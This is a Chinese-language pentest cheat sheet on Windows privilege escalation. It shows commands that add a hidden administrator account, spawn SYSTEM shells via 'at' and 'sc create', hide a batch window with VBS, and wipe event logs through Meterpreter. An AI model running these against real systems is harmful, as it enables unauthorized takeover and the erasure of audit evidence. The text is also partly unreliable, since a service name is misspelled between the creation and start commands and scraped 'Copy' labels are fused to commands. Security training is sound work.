提权可分为纵向提权与横向提权：纵向提权：低权限角色获得高权限角色的权限；横向提权：获取同级别角色的权限。



Windows常用的提权方法有：
系统内核溢出漏洞提权、数据库提权、错误的系统配置提权、组策略首选项提权、WEB中间件漏洞提权、DLL劫持提权、滥用高危权限令牌提权、第三方软件/服务提权等



#### 基础提权命令

```
0.mstsc #打开windows远程登录工具
1.query user #查看用户登录情况
2.net user #查看系统用户情况
3.net user username password /add  #添加用户
4.net localgroup Administrators username /add  #将用户添加到管理员组
5.whoami #查看当前用户权限
6.tasklist #查看运行的进程的pid 配合grep使用
7.taskkill /im 映像名称.exe /f #强制结束指定进程
8.systeminfo #查看系统版本与补丁情况
```

```
#rdesktop是linux上得远程桌面工具
rdesktop ip
#然后yes

```









#### cmd命令大全



```
move 移动文件
copy 复制文件
type 查看文本
echo %cd% 查看当前目录
rename 该文件名
taskkill /im 程序 /f 
del /f /q file 删除文件
```







#### at计划任务

```
at 是一个发布定时任务计划的命令行工具，语法比较简单。通过 at 命令发布的定时任务计划， Windows 默认以 SYSTEM 权限运行。定时任务计划可以是批处理、可以是一个二进制文件。

Copy
语法：at 时间 命令
例子：at 10:45PM calc.exe
该命令会发布一个定时任务计划，在每日的 10:45 启动 calc.exe。我们可以通过 “/interactive”开启界面交互模式：

```

####  sc命令提权

关于sc命令： SC 是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于“控制面板”中“管理工具”项中的“服务”。

```
Copysc Create syscmd binPath= "cmd /K start" type= own type= interact
```

这个命令的意思是创建一个名叫 syscmd 的新的交互式的 cmd 服务，然后执行以下命令，就得到了一个system权限的cmd环境：

```
Copysc start systcmd
```

##### vbs 设置取消这个bat黑窗

```
set ws=WScript.CreateObject("WScript.Shell")
ws.Run "C:\abc\script.bat /start",0
```

#### 清理日志

```
工具：Metasploit

为了实现这个目的，我们需要通过事件管理器模块清除事件日志。

这里，假设经过一系列的渗透测试已经获取了system权限的meterpreter，以下命令在meterpreter命令行下执行:

1.查看事件日志
run event_manager -i
2.删除事件日志
run event_manager -c
或者在meterpreter命令行中输入clearv命令清除目标系统的事件日志。
```

